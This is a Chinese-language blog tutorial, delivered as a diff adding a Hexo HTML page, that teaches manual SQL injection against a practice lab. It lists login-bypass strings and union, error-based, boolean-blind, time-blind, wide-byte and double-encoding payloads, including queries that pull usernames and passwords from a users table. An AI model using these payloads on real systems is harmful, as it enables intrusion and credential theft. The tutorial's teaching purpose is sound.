@@ -1,0 +1,732 @@
+<!DOCTYPE html>
+<html  lang="zh-CN" >
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport"
+    content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="theme-color" content="#fff" id="theme-color">
+  <meta name="description" content="混口饭吃">
+  <link rel="icon" href="/img/logo.png">
+  <title>SQL注入原理和手工注入流程</title>
+  
+  
+  <meta property="og:title" content="SQL注入原理和手工注入流程">
+  
+  
+  <meta property="og:url" content="http://example.com/2022/01/16/SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%92%8C%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B/index.html">
+  
+  
+  <meta property="og:img" content="/img/author.jpg">
+  
+  
+  
+  <meta property="og:type" content="article">
+  <meta property="og:article:published_time" content="2022-01-16">
+  <meta property="og:article:modified_time" content="2022-02-12">
+  <meta property="og:article:author" content="YiHua">
+  
+  
+  <meta property="og:article:tag" content="SQL注入">
+  
+  
+  
+  
+  <script>
+    // control reverse button
+    var reverseDarkList = {
+      dark: 'light',
+      light: 'dark'
+    };
+    var themeColor = {
+      dark: '#1c1c1e',
+      light: '#fff'
+    }
+    // get the data of css prefers-color-scheme
+    var getCssMediaQuery = function() {
+      return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+    };
+    // reverse current darkmode setting function
+    var reverseDarkModeSetting = function() {
+      var setting = localStorage.getItem('user-color-scheme');
+      if(reverseDarkList[setting]) {
+        setting = reverseDarkList[setting];
+      } else if(setting === null) {
+        setting = reverseDarkList[getCssMediaQuery()];
+      } else {
+        return;
+      }
+      localStorage.setItem('user-color-scheme', setting);
+      return setting;
+    };
+    // apply current darkmode setting
+    var setDarkmode = function(mode) {
+      var setting = mode || localStorage.getItem('user-color-scheme');
+      if(setting === getCssMediaQuery()) {
+        document.documentElement.removeAttribute('data-user-color-scheme');
+        localStorage.removeItem('user-color-scheme');
+        document.getElementById('theme-color').content = themeColor[setting];
+      } else if(reverseDarkList[setting]) {
+        document.documentElement.setAttribute('data-user-color-scheme', setting);
+        document.getElementById('theme-color').content = themeColor[setting];
+      } else {
+        document.documentElement.removeAttribute('data-user-color-scheme');
+        localStorage.removeItem('user-color-scheme');
+        document.getElementById('theme-color').content = themeColor[getCssMediaQuery()];
+      }
+    };
+    setDarkmode();
+  </script>
+  <script>
+    function loadScript(url, cb) {
+      var script = document.createElement('script');
+      script.src = url;
+      if (cb) script.onload = cb;
+      script.async = true;
+      document.body.appendChild(script);
+    }
+  </script>
+  
+  <link rel="preload" href="//at.alicdn.com/t/font_1946621_i1kgafibvw.css" as="style" >
+  <link rel="preload" href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css" as="style" >
+  
+  <link rel="preload" href="/js/lib/lightbox/baguetteBox.min.js" as="script">
+  <link rel="preload" href="/js/lib/lightbox/baguetteBox.min.css" as="style" >
+  
+  
+  <link rel="preload" href="/js/lib/lozad.min.js" as="script">
+  
+  
+  
+  
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+  
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1946621_i1kgafibvw.css">
+
+  
+  
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css">
+
+  
+  
+<link rel="stylesheet" href="/js/lib/lightbox/baguetteBox.min.css">
+
+  
+  
+  
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <div class="wrapper">
+    
+    <nav class="navbar">
+  <div class="navbar-logo">
+    <span class="navbar-logo-main">
+      
+      <img class="navbar-logo-img" src="/img/logo.png" alt="logo">
+      
+      <span class="navbar-logo-dsc">混口饭吃</span>
+    </span>
+  </div>
+  <div class="navbar-menu">
+    
+    <a href="/" class="navbar-menu-item">
+    
+    首页
+    
+    </a>
+    
+    <a href="/archives" class="navbar-menu-item">
+    
+    归档
+    
+    </a>
+    
+    <a href="/tags" class="navbar-menu-item">
+    
+    标签
+    
+    </a>
+    
+    <a href="/categories" class="navbar-menu-item">
+    
+    分类
+    
+    </a>
+    
+    <a href="/about" class="navbar-menu-item">
+    
+    关于
+    
+    </a>
+    
+    <a href="/links" class="navbar-menu-item">
+    
+    友链
+    
+    </a>
+    
+    <a class="navbar-menu-item darknavbar" id="dark"><i class="iconfont icon-weather"></i></a>
+    <a class="navbar-menu-item searchnavbar" id="search"><i class="iconfont icon-search" style="font-size: 1.2rem; font-weight: 400;"></i></a>
+  </div>
+</nav>
+    
+    <div id="local-search" style="display: none;">
+      <input class="navbar-menu-item" id="search-input" placeholder="请输入搜索内容...">
+      <div id="search-content"></div>
+    </div>
+    
+    <div class="section-wrap">
+      <div class="container">
+        <div class="columns">
+          <main class="main-column">
+<article class="card card-content">
+  <header>
+    <h1 class="post-title">
+      SQL注入原理和手工注入流程
+    </h1>
+  </header>
+  <div class="post-meta post-show-meta">
+    <time datetime="2022-01-16T09:31:07.953Z">
+      <i class="iconfont icon-calendar" style="margin-right: 2px;"></i>
+      <span>2022-01-16</span>
+    </time>
+    
+    <span class="dot"></span>
+    
+    <a href="/categories/web安全/" class="post-meta-link">web安全</a>
+    
+    
+    
+    <span class="dot"></span>
+    <span>1.6k 字</span>
+    
+  </div>
+  
+  <div class="post-meta post-show-meta" style="margin-top: -10px;">
+    <div style="display: flex; align-items: center;">
+      <i class="iconfont icon-biaoqian" style="margin-right: 2px; font-size: 1.15rem;"></i>
+      
+      
+        <a href="/tags/SQL注入/" class="post-meta-link">SQL注入</a>
+      
+    </div>
+  </div>
+  
+  </header>
+  <div id="section" class="post-content">
+    <h1 id="一：sql注入"><a href="#一：sql注入" class="headerlink" title="一：sql注入"></a>一：sql注入</h1><h3 id="一：sql注入分类"><a href="#一：sql注入分类" class="headerlink" title="一：sql注入分类"></a>一：sql注入分类</h3><h5 id="1-根据请求方式分类"><a href="#1-根据请求方式分类" class="headerlink" title="1.根据请求方式分类"></a>1.根据请求方式分类</h5><p>GET方式请求注入</p>
+<p>POST方式请求注入</p>
+<h5 id="2-根据注入点参数分类"><a href="#2-根据注入点参数分类" class="headerlink" title="2.根据注入点参数分类"></a>2.根据注入点参数分类</h5><p>整数型注入</p>
+<p>字符型注入</p>
+<p>搜索型注入</p>
+<h5 id="3-根据sql注入点反馈类型分类"><a href="#3-根据sql注入点反馈类型分类" class="headerlink" title="3.根据sql注入点反馈类型分类"></a>3.根据sql注入点反馈类型分类</h5><p>union类型</p>
+<p>基础错误显示</p>
+<p>布尔类型</p>
+<p>基于时间</p>
+<p>其他类型</p>
+<h5 id="4-根据web应用的数据库类型分类"><a href="#4-根据web应用的数据库类型分类" class="headerlink" title="4.根据web应用的数据库类型分类"></a>4.根据web应用的数据库类型分类</h5><p>今天主要讲解整数注入和字符型注入</p>
+<p>mysql     sqlserver     oracle        access</p>
+<h3 id="二：sql注入万能密码"><a href="#二：sql注入万能密码" class="headerlink" title="二：sql注入万能密码"></a>二：sql注入万能密码</h3><h5 id="1-常见的万能密码"><a href="#1-常见的万能密码" class="headerlink" title="1.常见的万能密码"></a>1.常见的万能密码</h5><p>asp/aspx代码</p>
+<pre class="highlight"><span class="line">&#x27;.).or.(&#x27;.a.&#x27;=&#x27;.a</span><br><span class="line">or 1=1--</span><br><span class="line">&#x27;or 1=1--</span><br></pre>
+
+<p>php代码</p>
+<pre class="highlight"><span class="line">admin<span class="string">&#x27; #         </span></span><br><span class="line"><span class="string">&#x27;</span><span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span> <span class="comment">#</span></span><br><span class="line"><span class="string">&quot;or &quot;</span>a<span class="string">&quot;=&quot;</span>a    </span><br></pre>
+
+<h5 id="2-使用原理"><a href="#2-使用原理" class="headerlink" title="2.使用原理"></a>2.使用原理</h5><p>通过mysql数据库的命令来实现的</p>
+<p>当输入账号和密码后通过select * from 命令来查询user表中是否有输入的账号密码，如果有就会返回登录成功</p>
+<p>没有就会返回登录失败</p>
+<p>正好常的php源码</p>
+<pre class="highlight"><span class="line">select * <span class="keyword">from</span> user where username= <span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> password= <span class="string">&#x27;123456&#x27;</span>   </span><br></pre>
+
+<p>将万能密码放入用户名输入框代码会变为</p>
+<p>输入的账号为空则值为假,但是1=1恒为真，or的意思是当一个为真那么另一个也为真 ，跟一个“#”号是注释符</p>
+<p>在mysql执行的命令会变为select * from user(查询user表中的所有信息)。有返回信息则成功</p>
+<pre class="highlight"><span class="line">select * <span class="keyword">from</span> user where username= <span class="string">&#x27;&#x27;</span><span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span> <span class="comment"># and password= &#x27;123456&#x27;  </span></span><br></pre>
+
+<h3 id="三：sql注入联合查询"><a href="#三：sql注入联合查询" class="headerlink" title="三：sql注入联合查询"></a>三：sql注入联合查询</h3><h5 id="1-判断是否有注入点和注入类型"><a href="#1-判断是否有注入点和注入类型" class="headerlink" title="1.判断是否有注入点和注入类型"></a>1.判断是否有注入点和注入类型</h5><p>单引号判断是否有注入点，如果页面返回错误，则可能存在 Sql 注入。</p>
+<p> 原因是无论字符型还是整型都会因为单引号个数不匹配而报错</p>
+<p>如下字符型代码</p>
+<pre class="highlight"><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre>
+
+<p>当$id=1’时则代码会返回</p>
+<pre class="highlight"><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;1’&#x27; LIMIT 0,1&quot;</span>;</span><br></pre>
+
+<p>数字型代码如下</p>
+<pre class="highlight"><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre>
+
+<p>当$id=1’时则代码会返回</p>
+<pre class="highlight"><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=1&#x27; LIMIT 0,1&quot;</span>;</span><br></pre>
+
+<p>如何区分是字符型和数字型</p>
+<p>数字型测试方法；</p>
+<p>and 1=1 最经典的测试方法</p>
+<p>当是数字形式执行代码如下</p>
+<pre class="highlight"><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=1 and 1=1 LIMIT 0,1&quot;</span>;</span><br></pre>
+
+<p>页面正常运行</p>
+<p>and 1=2 时代码运行如下</p>
+<pre class="highlight"><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=1 and 1=2 LIMIT 0,1&quot;</span>;</span><br></pre>
+
+<p>1=2不成立运行错误</p>
+<p>可判断该类型为数字型</p>
+<p>同理如果将and 1=1 带入到字符型中就会出现如下情况</p>
+<p>代码运行如下</p>
+<pre class="highlight"><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=‘1 and 1=1’ LIMIT 0,1&quot;</span>;</span><br></pre>
+
+<p>不会产生逻辑判断所以不管是and 1=1 或and 1=2都会显示正常，所以也可以根据这种情况来进行判断</p>
+<p>字符型测试方法；</p>
+<p>and ‘1’=’1来进行判断</p>
+<p>后台运行代码为</p>
+<pre class="highlight"><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=‘1 and ’1’=‘1’ LIMIT 0,1&quot;</span>;</span><br></pre>
+
+<p>则页面运行正常</p>
+<p>and ‘1’=’2 时代码执行如下</p>
+<pre class="highlight"><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=‘1 and ’1’=‘2’ LIMIT 0,1&quot;</span>;</span><br></pre>
+
+<p>1=2不成立运行错误</p>
+<p>可判断该类型为字符型</p>
+<p>通过靶场来测</p>
+<p>输入单引号后出现报错</p>
+<p><img src="C:/Users/25986/AppData/Roaming/Typora/typora-user-images/image-20220116164526712.png" alt="image-20220116164526712" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="C:/Users/25986/AppData/Roaming/Typora/typora-user-images/image-20220116164526712.png" class="lozad post-image"></p>
+<p>报错信息</p>
+<pre class="highlight"><span class="line"><span class="string">&#x27;1&#x27;</span><span class="string">&#x27; LIMIT 0,1</span></span><br></pre>
+
+<p>判断该类型为字符型注入</p>
+<p><img src="C:/Users/25986/AppData/Roaming/Typora/typora-user-images/image-20220116164128733.png" alt="image-20220116164128733" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="C:/Users/25986/AppData/Roaming/Typora/typora-user-images/image-20220116164128733.png" class="lozad post-image"></p>
+<h5 id="2-判断字段数"><a href="#2-判断字段数" class="headerlink" title="2.判断字段数"></a>2.判断字段数</h5><p>利用order by 来判断字段数</p>
+<p><img src="C:/Users/25986/AppData/Roaming/Typora/typora-user-images/image-20220116164757246.png" alt="image-20220116164757246" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="C:/Users/25986/AppData/Roaming/Typora/typora-user-images/image-20220116164757246.png" class="lozad post-image"></p>
+<p>从1递曾测试，当输入4时出现回显报错，说明字段数为3</p>
+<p><img src="C:/Users/25986/AppData/Roaming/Typora/typora-user-images/image-20220116165203158.png" alt="image-20220116165203158" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="C:/Users/25986/AppData/Roaming/Typora/typora-user-images/image-20220116165203158.png" class="lozad post-image"></p>
+<h5 id="3-联合查询"><a href="#3-联合查询" class="headerlink" title="3.联合查询"></a>3.联合查询</h5><p>利用union select 联合查询数据库中的数据</p>
+<p>利用mysql数据库命令select database()命令查询当前所在的数据库</p>
+<pre class="highlight"><span class="line"><span class="string">&#x27;union select 1,2,3 %23   //%23 为#</span></span><br></pre>
+
+<p><img src="C:/Users/25986/AppData/Roaming/Typora/typora-user-images/image-20220116165549893.png" alt="image-20220116165549893" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="C:/Users/25986/AppData/Roaming/Typora/typora-user-images/image-20220116165549893.png" class="lozad post-image"></p>
+<p><img src="C:/Users/25986/AppData/Roaming/Typora/typora-user-images/image-20220116165852385.png" alt="image-20220116165852385" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="C:/Users/25986/AppData/Roaming/Typora/typora-user-images/image-20220116165852385.png" class="lozad post-image"></p>
+<p>利用mysql自带库information_schema查询security数据库的表名，information_schema数据库为mysql5.7以上版本带有的默认数据库。</p>
+<pre class="highlight"><span class="line"><span class="number">0</span><span class="string">&#x27; union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 1,1%23</span></span><br></pre>
+
+<p><img src="C:/Users/25986/AppData/Roaming/Typora/typora-user-images/image-20220116170913259.png" alt="image-20220116170913259" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="C:/Users/25986/AppData/Roaming/Typora/typora-user-images/image-20220116170913259.png" class="lozad post-image"></p>
+<p>1.table_name字段保存着数据库中所有的表的信息.</p>
+<p>2.来自数据库information_schema中的tables表</p>
+<p>3.位置在table_schema字段下的security的数据库</p>
+<p>4.通过limit命令依次输出表</p>
+<p>利用mysql自带库information_schema查询security数据库中users表中的字段</p>
+<p>1.column_name字段中存有所有数据库的字段</p>
+<p>2.来自数据库information_schema中的columns的表</p>
+<p><img src="C:/Users/25986/AppData/Roaming/Typora/typora-user-images/image-20220116171416202.png" alt="image-20220116171416202" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="C:/Users/25986/AppData/Roaming/Typora/typora-user-images/image-20220116171416202.png" class="lozad post-image"></p>
+<pre class="highlight"><span class="line"><span class="string">&#x27; union select 1,column_name,3 frominformation_schema.columns where table_schema=database() and table_name=&#x27;</span>users<span class="string">&#x27; limit 1,1%23</span></span><br></pre>
+
+<p><img src="C:/Users/25986/AppData/Roaming/Typora/typora-user-images/image-20220116171657113.png" alt="image-20220116171657113" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="C:/Users/25986/AppData/Roaming/Typora/typora-user-images/image-20220116171657113.png" class="lozad post-image"></p>
+<p>查询username,password的值 ，来自sencurity数据库中的users表</p>
+<pre class="highlight"><span class="line"><span class="string">&#x27; union select 1,username,password from security.users limit 1,1%23</span></span><br></pre>
+
+<p><img src="C:/Users/25986/AppData/Roaming/Typora/typora-user-images/image-20220116172000155.png" alt="image-20220116172000155" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="C:/Users/25986/AppData/Roaming/Typora/typora-user-images/image-20220116172000155.png" class="lozad post-image"></p>
+<p><img src="C:/Users/25986/AppData/Roaming/Typora/typora-user-images/image-20220116172045203.png" alt="image-20220116172045203" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="C:/Users/25986/AppData/Roaming/Typora/typora-user-images/image-20220116172045203.png" class="lozad post-image"></p>
+<p>到这一步就完成了(get)字符型的注入</p>
+<p>补充常用函数</p>
+<pre class="highlight"><span class="line">Concat()    <span class="comment">//：将多个字符串链接成一个字符串</span></span><br><span class="line">Concat_ws()和concat()一样   <span class="comment">//：将多个字符串链接成一个字符串，但可以指定分隔符</span></span><br><span class="line">Group_concat()		<span class="comment">//：将多行结果连接成一组</span></span><br></pre>
+
+<h3 id="四：报错注入"><a href="#四：报错注入" class="headerlink" title="四：报错注入"></a>四：报错注入</h3><h4 id="extractvalue-函数"><a href="#extractvalue-函数" class="headerlink" title="extractvalue()函数"></a>extractvalue()函数</h4><pre class="highlight"><span class="line">extractvalue(<span class="number">1</span>,<span class="number">2</span>)				<span class="comment">//接受两个参数</span></span><br></pre>
+
+<h5 id="payload构建"><a href="#payload构建" class="headerlink" title="payload构建"></a>payload构建</h5><pre class="highlight"><span class="line"><span class="string">&#x27;and extractvalue(1,concat(0x7e,database()))#</span></span><br></pre>
+
+<p><img src="SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%92%8C%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B.assets/image-20220212115826835.png" alt="image-20220212115826835" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%92%8C%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B.assets/image-20220212115826835.png" class="lozad post-image"></p>
+<h4 id="updatexml-函数"><a href="#updatexml-函数" class="headerlink" title="updatexml()函数"></a>updatexml()函数</h4><pre class="highlight"><span class="line">updatexml(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)					<span class="comment">//接受三个参数</span></span><br></pre>
+
+<h5 id="payload构建-1"><a href="#payload构建-1" class="headerlink" title="payload构建"></a>payload构建</h5><pre class="highlight"><span class="line"><span class="string">&#x27; and updatexml(1,concat(0x7e,database()),3)#</span></span><br></pre>
+
+<p><img src="SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%92%8C%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B.assets/image-20220212130337793.png" alt="image-20220212130337793" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%92%8C%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B.assets/image-20220212130337793.png" class="lozad post-image"></p>
+<h3 id="五：布尔盲注"><a href="#五：布尔盲注" class="headerlink" title="五：布尔盲注"></a>五：布尔盲注</h3><h4 id="substr-函数"><a href="#substr-函数" class="headerlink" title="substr()函数"></a>substr()函数</h4><pre class="highlight"><span class="line">substr(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)   		<span class="comment">//截取数据库某一列字段中的一部分</span></span><br></pre>
+
+<p><img src="SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%92%8C%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B.assets/image-20220212130839624.png" alt="image-20220212130839624" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%92%8C%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B.assets/image-20220212130839624.png" class="lozad post-image"></p>
+<h4 id="length-函数"><a href="#length-函数" class="headerlink" title="length()函数"></a>length()函数</h4><pre class="highlight"><span class="line">length(database())			<span class="comment">//获取当前数据库名的长度</span></span><br></pre>
+
+<p><img src="SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%92%8C%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B.assets/image-20220212131540627.png" alt="image-20220212131540627" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%92%8C%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B.assets/image-20220212131540627.png" class="lozad post-image"></p>
+<h4 id="ascii-函数"><a href="#ascii-函数" class="headerlink" title="ascii()函数"></a>ascii()函数</h4><pre class="highlight"><span class="line">ascii(length(database()))			<span class="comment">//将数据库名的长度转为ascii码</span></span><br></pre>
+
+<p><img src="SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%92%8C%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B.assets/image-20220212131845007.png" alt="image-20220212131845007" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%92%8C%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B.assets/image-20220212131845007.png" class="lozad post-image"></p>
+<h4 id="构建payload"><a href="#构建payload" class="headerlink" title="构建payload"></a>构建payload</h4><pre class="highlight"><span class="line"><span class="string">&#x27; and length(database())&gt;7 #             //判断数据库名的长度 查询的值为真</span></span><br></pre>
+
+<pre class="highlight"><span class="line"><span class="string">&#x27;and ascii(substr(database()，0，1))&gt;115			//判断数据库名的第一个字母</span></span><br></pre>
+
+<h3 id="五：时间盲注"><a href="#五：时间盲注" class="headerlink" title="五：时间盲注"></a>五：时间盲注</h3><h4 id="sleep-函数"><a href="#sleep-函数" class="headerlink" title="sleep()函数"></a>sleep()函数</h4><pre class="highlight"><span class="line">sleep(<span class="number">5</span>)				<span class="comment">//延时5秒响应</span></span><br></pre>
+
+<p><img src="SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%92%8C%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B.assets/image-20220212135544060.png" alt="image-20220212135544060" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%92%8C%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B.assets/image-20220212135544060.png" class="lozad post-image"></p>
+<h4 id="if-函数"><a href="#if-函数" class="headerlink" title="if()函数"></a>if()函数</h4><pre class="highlight"><span class="line"><span class="keyword">if</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)						<span class="comment">//三个参数进行条件判断</span></span><br></pre>
+
+<p><img src="SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%92%8C%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B.assets/image-20220212132251108.png" alt="image-20220212132251108" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%92%8C%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B.assets/image-20220212132251108.png" class="lozad post-image"></p>
+<h4 id="构建payload-1"><a href="#构建payload-1" class="headerlink" title="构建payload"></a>构建payload</h4><pre class="highlight"><span class="line"><span class="string">&#x27; and sleep(5)#				//查看是否有注入点，带入的参数为真</span></span><br></pre>
+
+<pre class="highlight"><span class="line"><span class="string">&#x27; and if(length(database())&gt;7,sleep(5),0)		//如果数据库名的长度大于7，则延迟5秒响应</span></span><br></pre>
+
+<pre class="highlight"><span class="line"><span class="string">&#x27; and if(ascii(substr(database(),0,1))&gt;115,sleep(5),0)		//判断数据库名的第一个字母</span></span><br></pre>
+
+<h3 id="六：宽字节注入"><a href="#六：宽字节注入" class="headerlink" title="六：宽字节注入"></a>六：宽字节注入</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p><img src="SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%92%8C%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B.assets/image-20220212162425598.png" alt="image-20220212162425598" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%92%8C%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B.assets/image-20220212162425598.png" class="lozad post-image"></p>
+<p><img src="SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%92%8C%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B.assets/image-20220212190705793.png" alt="image-20220212190705793" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%92%8C%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B.assets/image-20220212190705793.png" class="lozad post-image"></p>
+<h4 id="构建payload-2"><a href="#构建payload-2" class="headerlink" title="构建payload"></a>构建payload</h4><pre class="highlight"><span class="line">%<span class="number">81</span> - %fe								<span class="comment">//之间的数都可以进行利用</span></span><br></pre>
+
+<pre class="highlight"><span class="line">%<span class="number">81</span><span class="string">&#x27; and 1=1 #</span></span><br></pre>
+
+<h3 id="七：二次编码注入"><a href="#七：二次编码注入" class="headerlink" title="七：二次编码注入"></a>七：二次编码注入</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p><img src="SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%92%8C%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B.assets/image-20220212192951745.png" alt="image-20220212192951745" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%92%8C%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B.assets/image-20220212192951745.png" class="lozad post-image"></p>
+<h4 id="构建payload-3"><a href="#构建payload-3" class="headerlink" title="构建payload"></a>构建payload</h4><p><img src="SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%92%8C%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B.assets/image-20220212193513015.png" alt="image-20220212193513015" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%92%8C%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B.assets/image-20220212193513015.png" class="lozad post-image"></p>
+<pre class="highlight"><span class="line">%<span class="number">2527</span>				<span class="comment">//单引号url两次编码后的值</span></span><br></pre>
